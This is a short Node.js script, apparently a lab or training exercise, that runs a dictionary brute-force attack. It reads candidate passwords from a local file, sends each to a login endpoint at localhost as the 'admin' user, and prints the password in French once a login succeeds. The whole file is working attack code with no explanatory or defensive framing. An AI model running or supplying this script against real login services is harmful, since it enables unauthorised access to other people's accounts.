const fs = require('node:fs/promises');

const PASSWORDS_PATH = "./passwords.txt";
const API_URL = "http://localhost:3000/login"

async function main() {
    try {
        await fs.access(PASSWORDS_PATH, fs.constants.R_OK);
        const dataBuffer = await fs.readFile(PASSWORDS_PATH);
        const dataString = dataBuffer.toString();
        const passwords = dataString.split(/\n/);

        for (let password of passwords) {
            const res = await fetch(API_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: "admin",
                    password
                })
            });
            if (res.ok) {
                const data = await res.json();
                if (data.success) {
                    console.log("Mot de passe trouvé : ", password);
                    break;
                }
            }
            console.log(password, "X");
        }
    } catch (error) {
        console.error(error.message);
    }
}

main();